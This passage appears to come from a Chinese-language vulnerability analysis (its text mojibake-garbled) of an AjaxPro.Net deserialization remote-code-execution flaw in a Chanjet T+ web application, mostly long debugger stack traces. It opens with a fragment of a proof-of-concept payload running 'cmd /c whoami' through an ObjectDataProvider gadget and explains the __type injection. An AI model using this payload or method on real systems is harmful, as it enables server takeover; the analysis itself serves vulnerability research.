&quot;FileName&quot;:&quot;cmd&quot;, &quot;Arguments&quot;:&quot;/c whoami &gt; testwhoami.txt&quot; &#125; &#125; &#125;&#125; æ‰§è¡Œç»“æœï¼š å †æ ˆ å¦‚ä¸Šæ‰€ç¤ºPOCï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡Œ Arguments æ—¶ï¼Œping å‘½ä»¤è°ƒç”¨åˆ°äº† System.Diagnostics.Process.Start å‡½æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 System.dll!System.Diagnostics.Process.Start() (IL=0x0000, Native=0x09963278+0x8) [æœ¬æœºåˆ°æ‰˜ç®¡çš„è½¬æ¢] mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL=epilog, Native=0x6A109B90+0xCA) mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E) mscorlib.dll!System.RuntimeType.InvokeMember(string name, System.Reflection.BindingFlags bindingFlags, System.Reflection.Binder binder, object target, object[] providedArgs, System.Reflection.ParameterModifier[] modifiers, System.Globalization.CultureInfo culture, string[] namedParams) (ILâ‰ˆ0x073D, Native=0x6A0CE270+0xAC8) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(out System.Exception e) (ILâ‰ˆ0x0025, Native=0x09963000+0x82) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.QueryWorker(object obj) (ILâ‰ˆ0x008C, Native=0x09962750+0xF5) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.BeginQuery() (IL=epilog, Native=0x03A4FE18+0xC8) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.ObjectInstance.set(object value) (IL=epilog, Native=0x09962DB8+0x9B) [æœ¬æœºåˆ°æ‰˜ç®¡çš„è½¬æ¢] mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (ILâ‰ˆ0x0016, Native=0x6A109B90+0x61) mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E) mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] index, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A0EF6E0+0x65) mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, object[] index) (IL=epilog, Native=0x6A0EF6C0+0x18)&gt; AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) (ILâ‰ˆ0x015E, Native=0x03A67FF8+0x311) AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) (ILâ‰ˆ0x0151, Native=0x00CF5D30+0x2E6) AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() (ILâ‰ˆ0x0180, Native=0x12CA1F98+0x290) AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() (ILâ‰ˆ0x01F6, Native=0x12CA0040+0x3B8) AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=0x0010, Native=0x12C7FA58+0x2C) System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (ILâ‰ˆ0x018D, Native=0x12A84DC0+0x305) System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x0E35F2A8+0x6E) System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (ILâ‰ˆ0x0015, Native=0x0E35F070+0x4A) System.Web.dll!System.Web.HttpApplication.ApplicationStepManager.ResumeSteps(System.Exception error) (ILâ‰ˆ0x00F6, Native=0x0E35D228+0x1C7) System.Web.dll!System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(System.Web.HttpContext context, System.AsyncCallback cb, object extraData) (IL=0x005C, Native=0x0E35CC68+0xDC) System.Web.dll!System.Web.HttpRuntime.ProcessRequestInternal(System.Web.HttpWorkerRequest wr) (ILâ‰ˆ0x015B, Native=0x06F5CCF0+0x29B) System.Web.dll!System.Web.HttpRuntime.ProcessRequestNoDemand(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A7C0+0x4F) System.Web.dll!System.Web.HttpRuntime.ProcessRequest(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A540+0x31) Chanjet.TP.WebServer.dll!Mono.WebServer.MonoWorkerRequest.ProcessRequest() (ILâ‰ˆ0x000F, Native=0x06F59E20+0x37) Chanjet.TP.WebServer.dll!Mono.WebServer.BaseApplicationHost.ProcessRequest(Mono.WebServer.MonoWorkerRequest mwr) (ILâ‰ˆ0x002A, Native=0x06F59C38+0x5E) Chanjet.TP.WebServer.FastCgi.exe!Mono.WebServer.FastCgi.ApplicationHost.ProcessRequest(Mono.WebServer.FastCgi.Responder responder) (IL=0x0055, Native=0x06F53E50+0x10D) mscorlib.dll!System.Runtime.Remoting.Messaging.StackBuilderSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL=???, Native=0x6A0D42B0+0x1F4) mscorlib.dll!System.Runtime.Remoting.Messaging.ServerObjectTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (ILâ‰ˆ0x0048, Native=0x6A0D4238+0x67) mscorlib.dll!System.Runtime.Remoting.Messaging.ServerContextTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (ILâ‰ˆ0x004F, Native=0x6A0D413C+0x8B) mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessageCallback(object[] args) (ILâ‰ˆ0x0059, Native=0x6A0D3E94+0x98) mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD) mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (ILâ‰ˆ0x001F, Native=0x6A0D3D40+0xA1) mscorlib.dll!System.Runtime.Remoting.Channels.ChannelServices.SyncDispatchMessage(System.Runtime.Remoting.Messaging.IMessage msg) (ILâ‰ˆ0x0042, Native=0x6A0EAF38+0x93) mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (ILâ‰ˆ0x0047, Native=0x6A0D2F50+0xF4) mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatchCallback(object[] args) (ILâ‰ˆ0x0016, Native=0x6A0D77EC+0x84) mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD) [ç¨‹åºåŸŸè½¬æ¢] mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (ILâ‰ˆ0x0002, Native=0x6A0D2E5C+0x7A) mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (ILâ‰ˆ0x0053, Native=0x6A0D24AC+0x9A) mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.CallProcessMessage(System.Runtime.Remoting.Messaging.IMessageSink ms, System.Runtime.Remoting.Messaging.IMessage reqMsg, System.Runtime.Remoting.Contexts.ArrayWithSize proxySinks, System.Threading.Thread currentThread, System.Runtime.Remoting.Contexts.Context currentContext, bool bSkippingContextChain) (ILâ‰ˆ0x003A, Native=0x6A0D22EC+0x51) mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.InternalInvoke(System.Runtime.Remoting.Messaging.IMethodCallMessage reqMcmMsg, bool useDispatchMessage, int callType) (IL=???, Native=0x6A0D2070+0x1DE) mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.Invoke(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL=epilog, Native=0x6A0D2000+0x69) mscorlib.dll!System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(ref System.Runtime.Remoting.Proxies.MessageData msgData, int type) (ILâ‰ˆ0x0155, Native=0x6A0D1DA0+0xF4) Chanjet.TP.WebServer.FastCGI.exe!Mono.WebServer.FastCgi.Responder.Process() (IL=0x0068, Native=0x039C3988+0x162) Chanjet.TP.WebServer.FastCGI.exe!Mono.FastCgi.ResponderRequest.Worker(object state) (ILâ‰ˆ0x0002, Native=0x039C37C8+0x4B) mscorlib.dll!System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(object state) (IL=epilog, Native=0x6A0F0960+0x44) mscorlib.dll!System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (ILâ‰ˆ0x0079, Native=0x6A047D70+0xC4) mscorlib.dll!System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL=epilog, Native=0x6A047D50+0x17) mscorlib.dll!System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem() (IL=epilog, Native=0x6A0F09B0+0x45) mscorlib.dll!System.Threading.ThreadPoolWorkQueue.Dispatch() (IL=0x00A4, Native=0x6A0E1920+0x19D) mscorlib.dll!System.Threading._ThreadPoolWaitCallback.PerformWaitCallback() (IL=epilog, Native=0x6A0E1910+0xB) [æœ¬æœºåˆ°æ‰˜ç®¡çš„è½¬æ¢] å¦‚ä¸Šæ‰€ç¤ºä¸€å¤§å †ï¼Œåªéœ€è¦å…³æ³¨å…¶ä¸­çš„å‡ ä¸ªå°±å¯ä»¥ï¼š 12345678AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type)AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type)AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) å †æ ˆ&amp;æ¼ æ¼æ´å¤ç° ä»ä¸Šé¢åˆ†æå¯çŸ¥ï¼Œå¦‚æœè¦æ§åˆ¶ååºåˆ—åŒ–æ“ä½œçš„ Typeï¼Œé‚£ä¹ˆå¿…é¡»ä¿è¯ Ajax å¤„ç†å‡½æ•°çš„è¾“å‡ºå‚æ•°ç±»å‹æ˜¯å¯æ§çš„ï¼Œè€Œ GetStoreWarehouseByStore å‡½æ•°çš„è¾“å…¥å‚æ•°ä¸º Objectt ç±»å‹ï¼Œç¬¦åˆå½“å‰æ¼æ´è¦æ±‚ï¼š ä¿®æ”¹è¯·æ±‚æ•°æ®åŒ…ï¼ŒåŠ å…¥__typeå‚æ•°ï¼Œå¹¶åŠ å…¥ObjectDataProvideråˆ©ç”¨é“¾ï¼Œå‘é€æ•°æ®åŒ…åæˆåŠŸè§¦å‘RCEã€‚ å‘é€ Ajax è¯·æ±‚åï¼Œé¦–å…ˆä¼šè¿›å…¥ç»§æ‰¿äº IHttpHandler æ¥å£çš„ç±» AjaxSyncHttpHandlerï¼Œè°ƒç”¨å‡½æ•° ProcessRequest è¿›è¡Œå¤„ç†ï¼š æ¥ç€è¿›å…¥XmlHttpRequestProcessor.RetreiveParameterså‡½æ•°ï¼š å…¶ä¸­ç¬¬23è¡Œé€šè¿‡method.GetParametersåŠ è½½è‡ªå®šä¹‰çš„å…¨éƒ¨Ajax Methodï¼Œå³æ‰€æœ‰é‡‡ç”¨[AjaxPro.AjaxMethod]è¿›è¡Œè£…é¥°çš„å‡½æ•°ï¼Œæ¯”å¦‚æœ¬æ¬¡æ¼æ´çš„ GetStoreWarehouseByStore æ–¹æ³•ï¼š ä¸Šè¿° parameters çš„ç±»å‹ä¸º: &#123;System.Reflection.RuntimeParameterInfo&#125; System.Reflection.ParameterInfo &#123;System.Reflection.RuntimeParameterInfo&#125; è‡ªå®šä¹‰çš„ æ–¹æ³•ï¼š ((System.Reflection.RuntimeMethodInfo)parameters[0].MemberImpl).m_name = â€œGetStoreWarehouseByStoreâ€ æ¥ç€å¾€ä¸‹èµ°ï¼Œç¬¬120è¡Œé€šè¿‡JavaScriptDeserializer.DeserializeFromJsonååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªJavaScriptObjectå¯¹è±¡ï¼Œè¿™é‡ŒæŒ‡å®šäº†Typeç±»å‹ï¼Œç»§ç»­å¾€ä¸‹çœ‹ï¼š è¿›å…¥ JavaScriptDeserizlizer.Deserializer ï¼š è¿™é‡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨__typeå‚æ•°ï¼Œå¦‚æœå­˜åœ¨ä¸”é€šè¿‡__typeè·å–çš„Typeå¯¹è±¡ç»§æ‰¿äºå¤„ç†å‡½æ•°è¾“å…¥å‚æ•°æ•°æ®ç±»å‹ï¼ˆtype.IsAssignableFrom(t)ï¼‰ï¼Œå¯ä»¥ä¿®æ”¹ååºåˆ—åŒ–çš„typeå¯¹è±¡ã€‚ç»§ç»­å¾€ä¸‹èµ°ï¼Œæœ€ç»ˆè°ƒç”¨DeserializeCustomObjectå‡½æ•°å®Œæˆå¤„ç†ï¼Œå¤„ç†è¿‡ç¨‹ä¸.NET JavaScriptSerializerç­‰å…¶ä»–ååºåˆ—åŒ–æ–¹å¼éå¸¸ç±»ä¼¼ã€‚ åœ¨æ–°ç‰ˆæœ¬çš„ AjaxPro.Net ä¸­ï¼Œå¯¹è‡ªå®šä¹‰ååºåˆ—åŒ–ç±»å‹çš„æ“ä½œåŠ å…¥äº†é…ç½®é™åˆ¶ï¼Œåªæœ‰é¢„å…ˆé…ç½®å¥½çš„Typeç±»å‹æ‰èƒ½è¿›è¡Œä¿®æ”¹ï¼Œå¯¼è‡´æ¶æ„ç±»æ— æ³•è¢«æ’å…¥ã€‚ å †æ ˆè®°å½• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228Current frame: (MethodDesc 08d54d70 +0 System.Diagnostics.Process.Start())ChildEBP RetAddr Caller, Callee12eecd98 74302546 clr!CallDescrWorkerInternal+0x3412eecda4 7430e4c9 clr!CallDescrWorkerWithHandler+0x6b, calling clr!CallDescrWorkerInternal12eecdb8 7430e482 clr!CallDescrWorkerWithHandler+0x20, calling clr!_alloca_probe12eecdf8 7431171f clr!CallDescrWorkerReflectionWrapper+0x55, calling clr!CallDescrWorkerWithHandler12eece38 7431161f clr!RuntimeMethodHandle::InvokeMethod+0x747, calling clr!CallDescrWorkerReflectionWrapper12eece3c 74321428 clr!ArgIteratorForMethodInvoke::ArgIteratorForMethodInvoke+0x52, calling clr!MethodDesc::IsInterface12eece54 743113bb clr!RuntimeMethodHandle::InvokeMethod+0x224, calling clr!_alloca_probe_1612eeceb4 743112ce clr!RuntimeMethodHandle::InvokeMethod+0x6e, calling clr!LazyMachStateCaptureState12eecefc 7431efb5 clr!SigPointer::GetTypeHandleThrowing+0xb69, calling clr!__security_check_cookie12eecf28 7430fe88 clr!MetaSig::Init+0x16c, calling clr!CorSigUncompressData12eecf30 7430febe clr!MetaSig::Init+0x19e, calling clr!SigParser::SkipExactlyOne12eecf74 743201bb clr!InvokeUtil::IsDangerousMethod+0x10c, calling clr!MethodTable::ParentEquals12eecfa0 7432134c clr!ReflectionInvocation::GetSpecialSecurityFlags+0x6d, calling clr!_EH_epilog312eed0ac 72669c5a (MethodDesc 72330be0 +0xca System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(System.Object, System.Object[], System.Object[])), calling clr!RuntimeMethodHandle::InvokeMethod12eed0b8 7259c4c1 (MethodDesc 72323b28 +0x21 System.RuntimeMethodHandle.PerformSecurityCheck(System.Object, System.IRuntimeMethodInfo, System.RuntimeType, UInt32)), calling clr!ReflectionInvocation::PerformSecurityCheck12eed0d0 7266976e (MethodDesc 72330bcc +0x8e System.Reflection.RuntimeMethodInfo.Invoke(System.Object, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo)), calling (MethodDesc 72330be0 +0 System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(System.Object, System.Object[], System.Object[]))12eed0fc 7262ed38 (MethodDesc 723296c0 +0xac8 System.RuntimeType.InvokeMember(System.String, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object, System.Object[], System.Reflection.ParameterModifier[], System.Globalization.CultureInfo, System.String[]))12eed250 09e79e6a (MethodDesc 09daf980 +0x82 System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(System.Exception ByRef))12eed290 743037d0 clr!TypeHandle::GetSignatureCorElementType+0x13, calling clr!MethodTable::GetSignatureCorElementType12eed2a4 09e77e55 (MethodDesc 09daf968 +0xf5 System.Windows.Data.ObjectDataProvider.QueryWorker(System.Object)), calling (MethodDesc 09daf980 +0 System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(System.Exception ByRef))12eed2c8 09e74c08 (MethodDesc 09daf93c +0xc8 System.Windows.Data.ObjectDataProvider.BeginQuery()), calling (MethodDesc 09daf968 +0 System.Windows.Data.ObjectDataProvider.QueryWorker(System.Object))12eed2d8 09e79c43 (MethodDesc 09daf8c4 +0x9b System.Windows.Data.ObjectDataProvider.set_ObjectInstance(System.Object))12eed2e8 74302546 clr!CallDescrWorkerInternal+0x3412eed2f4 7430e4c9 clr!CallDescrWorkerWithHandler+0x6b, calling clr!CallDescrWorkerInternal12eed308 7430e482 clr!CallDescrWorkerWithHandler+0x20, calling clr!_alloca_probe12eed348 7431171f clr!CallDescrWorkerReflectionWrapper+0x55, calling clr!CallDescrWorkerWithHandler12eed388 7431161f clr!RuntimeMethodHandle::InvokeMethod+0x747, calling clr!CallDescrWorkerReflectionWrapper12eed3a4 743113bb clr!RuntimeMethodHandle::InvokeMethod+0x224, calling clr!_alloca_probe_1612eed404 743112ce clr!RuntimeMethodHandle::InvokeMethod+0x6e, calling clr!LazyMachStateCaptureState12eed428 7431eb4e clr!StgBlobPoolReadOnly::GetBlob+0x71, calling clr!MetaData::DataBlob::PeekCompressedU12eed44c 7431efb5 clr!SigPointer::GetTypeHandleThrowing+0xb69, calling clr!__security_check_cookie12eed478 7430fe88 clr!MetaSig::Init+0x16c, calling clr!CorSigUncompressData12eed480 7430febe clr!MetaSig::Init+0x19e, calling clr!SigParser::SkipExactlyOne12eed4c4 743201bb clr!InvokeUtil::IsDangerousMethod+0x10c, calling clr!MethodTable::ParentEquals12eed528 7432452c clr!Security::IsTypeCritical+0x37, calling clr!EEClass::IsCritical12eed580 725a5e1d (MethodDesc 7242cd2c +0x5d System.RuntimeType.CheckValue(System.Object, System.Reflection.Binder, System.Globalization.CultureInfo, System.Reflection.BindingFlags)), calling clr!RuntimeTypeHandle::IsValueType12eed5fc 72669bf1 (MethodDesc 72330be0 +0x61 System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(System.Object, System.Object[], System.Object[])), calling clr!RuntimeMethodHandle::InvokeMethod12eed620 7266976e (MethodDesc 72330bcc +0x8e System.Reflection.RuntimeMethodInfo.Invoke(System.Object, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo)), calling (MethodDesc 72330be0 +0 System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(System.Object, System.Object[], System.Object[]))12eed64c 7264f745 (MethodDesc 72333960 +0x65 System.Reflection.RuntimePropertyInfo.SetValue(System.Object, System.Object, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo))12eed674 7264f6d8 (MethodDesc 72333958 +0x18 System.Reflection.RuntimePropertyInfo.SetValue(System.Object, System.Object, System.Object[]))12eed690 0971c9a9 (MethodDesc 12efc328 +0x311 AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject, System.Type))12eed6dc 72588cc7 (MethodDesc 7242cb68 +0x37 System.RuntimeType.IsAssignableFrom(System.Type)), calling clr!RuntimeTypeHandle::CanCastTo12eed6f0 0971c426 (MethodDesc 12efc31c +0x2e6 AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject, System.Type)), calling (MethodDesc 12efc328 +0 AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject, System.Type))12eed748 0971af98 (MethodDesc 12ef9740 +0x290 AjaxPro.XmlHttpRequestProcessor.RetreiveParameters()), calling (MethodDesc 12efc31c +0 AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject, System.Type))12eed76c 0971938f (MethodDesc 12efc184 +0x3b7 AjaxPro.AjaxProcHelper.Run())12eed778 7447be07 clr!COMPlusCheckForAbort+0xfe, calling clr!EHWatsonBucketTracker::ClearWatsonBucketDetails12eed934 09718f94 (MethodDesc 12ef9e3c +0x2c AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext)), calling (MethodDesc 12efc184 +0 AjaxPro.AjaxProcHelper.Run())12eed948 113e263d (MethodDesc 0977a988 +0x305 System.Web.HttpApplication+CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()), calling 0469b96612eed950 0f4953e7 (MethodDesc 097775c4 +0x1bf System.Web.HttpApplication+AsyncEventExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute())12eed984 0f4d8dce (MethodDesc 04bbdc5c +0x6e System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep)), calling 0957164a12eed998 0f4d8b6a (MethodDesc 04bbdc78 +0x4a System.Web.HttpApplication.ExecuteStep(IExecutionStep, Boolean ByRef)), calling (MethodDesc 04bbdc5c +0 System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep))12eed9d4 0f4d710f (MethodDesc 09772814 +0x1c7 System.Web.HttpApplication+ApplicationStepManager.ResumeSteps(System.Exception)), calling (MethodDesc 04bbdc78 +0 System.Web.HttpApplication.ExecuteStep(IExecutionStep, Boolean ByRef))12eeda28 0f4d6e6c (MethodDesc 04bbdb3c +0xdc System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(System.Web.HttpContext, System.AsyncCallback, System.Object))12eeda40 0692ab13 (MethodDesc 047a88cc +0x29b System.Web.HttpRuntime.ProcessRequestInternal(System.Web.HttpWorkerRequest)), calling 0469b4a212eeda4c 7266d0cf (MethodDesc 7231fe24 +0x6f System.DateTime.get_UtcNow()), calling (MethodDesc 7231fc70 +0 System.DateTime.TimeToTicks(Int32, Int32, Int32))12eeda80 0692a06f (MethodDesc 047a8a28 +0x4f System.Web.HttpRuntime.ProcessRequestNoDemand(System.Web.HttpWorkerRequest)), calling (MethodDesc 047a88cc +0 System.Web.HttpRuntime.ProcessRequestInternal(System.Web.HttpWorkerRequest))12eeda90 06929dd1 (MethodDesc 047a8a1c +0x31 System.Web.HttpRuntime.ProcessRequest(System.Web.HttpWorkerRequest)), calling (MethodDesc 047a8a28 +0 System.Web.HttpRuntime.ProcessRequestNoDemand(System.Web.HttpWorkerRequest))12eedaa4 069296b7 (MethodDesc 063fe0d8 +0x37 Mono.WebServer.MonoWorkerRequest.ProcessRequest()), calling (MethodDesc 047a8a1c +0 System.Web.HttpRuntime.ProcessRequest(System.Web.HttpWorkerRequest))12eedaec 069294f6 (MethodDesc 063fd2ac +0x5e Mono.WebServer.BaseApplicationHost.ProcessRequest(Mono.WebServer.MonoWorkerRequest)), calling (MethodDesc 063fe0d8 +0 Mono.WebServer.MonoWorkerRequest.ProcessRequest())12eedb1c 069237bd (MethodDesc 063fd3c0 +0x10d Mono.WebServer.FastCgi.ApplicationHost.ProcessRequest(Mono.WebServer.FastCgi.Responder)), calling 0692315012eedb68 74302546 clr!CallDescrWorkerInternal+0x3412eedb74 7430e4c9 clr!CallDescrWorkerWithHandler+0x6b, calling clr!CallDescrWorkerInternal12eedb88 7430e482 clr!CallDescrWorkerWithHandler+0x20, calling clr!_alloca_probe12eedbc8 7471fbe4 clr!CallDescrWithObjectArray+0x4d0, calling clr!CallDescrWorkerWithHandler12eedc00 7471f8b3 clr!CallDescrWithObjectArray+0xd7, calling clr!_alloca_probe_1612eedcc8 7471f59a clr!CStackBuilderSink::PrivateProcessMessage+0x1b4, calling clr!CallDescrWithObjectArray12eedd38 7441d69e clr!PEImage::Equals+0xd6, calling clr!_EH_epilog312eedd88 7471f4b5 clr!CStackBuilderSink::PrivateProcessMessage+0x75, calling clr!LazyMachStateCaptureState12eedd94 7441da51 clr!PEFile::Equals+0xbd, calling clr!PEImage::Equals12eeddbc 743b8189 clr!CRealProxy::ProxyTypeIdentityCheck+0x75, calling clr!PEFile::Equals12eedde8 743b6533 clr!CRealProxy::UpdateOptFlags+0xd3, calling ucrtbase_clr0400!strcmp12eeddf0 743b645a clr!CRealProxy::UpdateOptFlags+0x108, calling clr!CRealProxy::ProxyTypeIdentityCheck12eede38 743b6424 clr!CRemotingServices::CheckCast+0x70, calling clr!CRealProxy::UpdateOptFlags12eede64 743b4d91 clr!ObjIsInstanceOf+0x5e, calling clr!CRemotingServices::CheckCast12eedeac 7472b612 clr!IsInstanceOfTypeHelper+0x87, calling clr!ObjIsInstanceOf12eedeb0 7472b5d1 clr!IsInstanceOfTypeHelper+0x46, calling clr!_EH_epilog312eedee8 74302546 clr!CallDescrWorkerInternal+0x3412eedef8 7430e4da clr!CallDescrWorkerWithHandler+0x9b, calling clr!CallDescrWorkerWithHandler+0x7e12eedf10 7472b5c6 clr!IsInstanceOfTypeHelper+0x3b, calling clr!LazyMachStateCaptureState12eedf44 7472b5d1 clr!IsInstanceOfTypeHelper+0x46, calling clr!_EH_epilog312eedf48 7472b697 clr!RuntimeTypeHandle::IsInstanceOfType+0x49, calling clr!IsInstanceOfTypeHelper12eedf58 725a5d0b (MethodDesc 7242cb50 +0xb System.RuntimeType.IsInstanceOfType(System.Object)), calling clr!RuntimeTypeHandle::IsInstanceOfType12eedf5c 72634a9b (MethodDesc 723f9790 +0x4f System.Runtime.Remoting.Messaging.Message.CoerceArg(System.Object, System.Type))12eedfa4 7430cb49 clr!JIT_Stelem_Ref+0x25, calling clr!JIT_WriteBarrierEAX12eedfa8 72634a17 (MethodDesc 723f9784 +0x7f System.Runtime.Remoting.Messaging.Message.CoerceArgs(System.Reflection.MethodBase, System.Object[], System.Reflection.ParameterInfo[])), calling clr!JIT_Stelem_Ref12eedfb0 7263478c (MethodDesc 723fa290 +0xb8 System.Runtime.Remoting.Messaging.StackBuilderSink.VerifyIsOkToCallMethod(System.Object, System.Runtime.Remoting.Messaging.IMethodMessage))12eedfcc 726347c4 (MethodDesc 723fa284 +0x2c System.Runtime.Remoting.Messaging.StackBuilderSink.GetMethodBase(System.Runtime.Remoting.Messaging.IMethodMessage)), calling (MethodDesc 72321e0c +0 System.Reflection.MethodBase.op_Equality(System.Reflection.MethodBase, System.Reflection.MethodBase))12eedfec 726344a4 (MethodDesc 7230cc10 +0x1f4 System.Runtime.Remoting.Messaging.StackBuilderSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage)), calling clr!CStackBuilderSink::PrivateProcessMessage12eee04c 7263429f (MethodDesc 723fa230 +0x67 System.Runtime.Remoting.Messaging.ServerObjectTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage))12eee060 726341c7 (MethodDesc 723f9e80 +0x8b System.Runtime.Remoting.Messaging.ServerContextTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage)), calling 0168c28a12eee090 72633f2c (MethodDesc 721cef2c +0x98 System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessageCallback(System.Object[])), calling 0168770612eee0cc 72662505 (MethodDesc 72328110 +0xd System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate, System.Object[]))12eee0d0 74302546 clr!CallDescrWorkerInternal+0x3412eee0dc 7430e4c9 clr!CallDescrWorkerWithHandler+0x6b, calling clr!CallDescrWorkerInternal12eee0f0 7430e482 clr!CallDescrWorkerWithHandler+0x20, calling clr!_alloca_probe12eee130 74322440 clr!DispatchCallDebuggerWrapper+0x59, calling clr!CallDescrWorkerWithHandler12eee174 74322695 clr!DispatchCallSimple+0x8e, calling clr!DispatchCallDebuggerWrapper12eee1c0 743b6e26 clr!ThreadNative::InternalCrossContextCallback+0x1db, calling 